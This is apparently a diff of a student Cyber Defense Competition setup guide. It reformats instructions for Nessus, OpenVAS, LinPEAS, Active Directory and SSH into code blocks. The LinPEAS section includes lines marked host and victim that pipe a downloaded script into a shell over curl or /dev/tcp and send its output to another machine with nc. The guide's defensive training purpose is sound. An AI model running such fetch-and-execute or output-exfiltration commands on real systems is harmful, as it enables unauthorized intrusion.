@@ -71,6 +71,7 @@ Be sure to rememember your credentials as they are necessary for accessing the n
 
 Create or join a team of up to eight players.
 
+---
 ## Competition Network and Environment
 
 After registering, the network can be accessed at https://vcenter.iseage.org/ be sure you are connected CDC network otherwise you will not be able to access the server.
@@ -88,6 +89,8 @@ After registering, the network can be accessed at https://vcenter.iseage.org/ be
 
   Select Web Console and hit launch to open the machine in a new tab within your browser
   <img src="https://i.imgur.com/xG0guhG.png">
+
+  ---
  
 ## Planning a Playbook and Basic Triaging
 ## Creating a Practice Network
@@ -165,11 +168,11 @@ Nessus is an enterprise tool that is quite reputable and is widely used within t
     
   For Linux:
   -  Open a terminal, navigate to the download directory, and run the following commands:
-
-    sudo chmod +x Nessus-*.rpm (or .deb)
+```bash
+sudo chmod +x Nessus-*.rpm (or .deb)
    
-    sudo ./Nessus-*.rpm (or .deb
-
+sudo ./Nessus-*.rpm (or .deb
+```
 
 2. Start the Nessus Service
 
@@ -178,8 +181,9 @@ Nessus is an enterprise tool that is quite reputable and is widely used within t
     
   On Linux:
   -  start the Nessus service with the following command:
-    
-    sudo /etc/init.d/nessusd start
+```bash
+sudo /etc/init.d/nessusd start
+```
 
 3. Open a web browser and go to https://localhost:8834
 4. Follow the on-screen instructions to register your Nessus installation and activate your license.
@@ -246,36 +250,53 @@ OpenVAS is a comprehensive vulnerability scanning tool that detects security iss
 LinPEAS is not specifically a vulnerability scanner in the traditional sense, but rather a tool for identifying potential security weaknesses and paths to escalate privileges on Linux systems. It can be useful for incident response by providing you with information of vulnerable or weak areas to patch or secure.
 
  From github
-
-    curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+```bash
+  curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+```
 
  Without curl
-  
-    python -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"
-
-    python3 -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"
-
+  ```bash
+  python -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"
+```
+```bash
+  python3 -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"
+  ```
  Local network
-
-    sudo python3 -m http.server 80 #Host
-    curl 10.10.10.10/linpeas.sh | sh #Victim
+   ```bash
+  sudo python3 -m http.server 80 #Host
+   ```
+```bash
+  curl 10.10.10.10/linpeas.sh | sh #Victim
+  ```
 
  Without curl
-
-    sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
-    cat < /dev/tcp/10.10.10.10/80 | sh #Victim
+  ```bash
+  sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
+```
+```bash
+  cat < /dev/tcp/10.10.10.10/80 | sh #Victim
+```
 
 Excute from memory and send output back to the host
-
-    nc -lvnp 9002 | tee linpeas.out #Host
-    curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
+  ```bash
+  nc -lvnp 9002 | tee linpeas.out #Host
+```
+```bash
+  curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
+```
 
 Use a linpeas binary
+  ```bash
+  wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
+```
+```bash
+  chmod +x linpeas_linux_amd64
+```
+```bash
+  ./linpeas_linux_amd64
+  ```
 
-    wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
-    chmod +x linpeas_linux_amd64
-    ./linpeas_linux_amd64
-
+---
 ## Changing Default Passwords
 One of the most important tasks to take care upon first receiving your machines is to change all default passwords to the hosts on your network.
 
@@ -296,6 +317,7 @@ Open a terminal and type the following command
 You will be prompt to enter your current password followed by being asked to enter a new password
 <img src="https://itslinuxfoss.com/wp-content/uploads/2023/02/image-995.png">
 
+---
 ## Configuring Active Directory
  ###  Powershell
 Using powershell to join hosts to the domain can be efficiently especially for tasks that involve automation and scripting. PowerShell provides cmdlets specifically designed for managing Active Directory and performing domain join operations. This provides a more straightforward approach in setting up the AD server however may vary slightly depending on 
@@ -308,20 +330,20 @@ Here's how you can set up AD and join hosts to the domain using PowerShell:
 2. Enter Crtrl+Shift+Enter to run as administrator
    
 4. Use the `Install-WindowsFeature` cmdlet to install the Active Directory Domain Services role:
-
+    ```powershell
        Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools
 
 5. Use the `Install-ADDSForest` cmdlet to promote the server to a domain controller:
-
+    ```powershell
        Install-ADDSForest -DomainName "isucdc.com" -DomainNetbiosName "ISUCDC" -ForestMode "WinThreshold" -DomainMode "WinThreshold" -InstallDns -Force
 
-6. Use the `Set-ADDirectoryServicesRestoreModePassword` cmdlet to set the Directory Services Restore Mode (DSRM) password:
+7. Use the `Set-ADDirectoryServicesRestoreModePassword` cmdlet to set the Directory Services Restore Mode (DSRM) password:
+   ```powershell
+       Set-ADDirectoryServicesRestoreModePassword -NewPassword (ConvertTo-SecureString -AsPlainText "YourDSRMPassword" -Force)
 
-       Set-ADDirectoryServicesRestoreModePassword -NewPassword (ConvertTo-SecureString -AsPlainText "YourDSRMPassword" -Force)     
+8. After promoting the server to a domain controller, restart the server to complete the process.
 
-7. After promoting the server to a domain controller, restart the server to complete the process.
-
-8. Joining Hosts to Active Directory:
+9. Joining Hosts to Active Directory:
 
 1. **Joining Windows Hosts**:
    - Use the `Add-Computer` cmdlet to join a Windows host to the domain:
@@ -339,38 +361,45 @@ Here's how you can set up AD and join hosts to the domain using PowerShell:
 3. **Verify Domain Join**:
    - Use PowerShell commands to verify the domain join status on both Windows and Linux hosts.
 
-
-
+----
 ## Enabling SSH on port 22
 SSH other wise known as the secure shell allows a user a secure way to remotely access a system and is often required for linux host within the CDC
 
 ### Alma Linux
 1. Install OpenSSH for your system
 
-        dnf install openssh-server openssh-clients
+  ```bash
+  dnf install openssh-server openssh-clients
+```
 
-2. Use systemctl to start or stop the SSH server
+1. Use systemctl to start or stop the SSH server
+ ```bash
+  systemctl start sshd
+```
+```bash
+  systemctl stop sshd
+```
 
-        systemctl start sshd
-   
-        systemctl stop sshd
+2. To enable SSH to automatically starts at system boot
 
-3. To enable SSH to automatically starts at system boot
-
-         systemctl enable sshd
-
+```bash
+  systemctl enable sshd
+```
   To Disable:
-
-         systemctl disable sshd
-
+```bash
+  systemctl disable sshd
+```
 4. To chech the SSH server status
-
-       systemctl status sshd
-
+```bash
+   systemctl status sshd
+```
 5. To allow traffic on SSH through the firewall execute the following
-
-       firewall-cmd --zone=public --permanent --add-service=ssh
-       firewall-cmd --reload
+```bash
+   firewall-cmd --zone=public --permanent --add-service=ssh
+```
+```bash
+   firewall-cmd --reload
+```
 
 ### Ubuntu
 1. Update the package index:
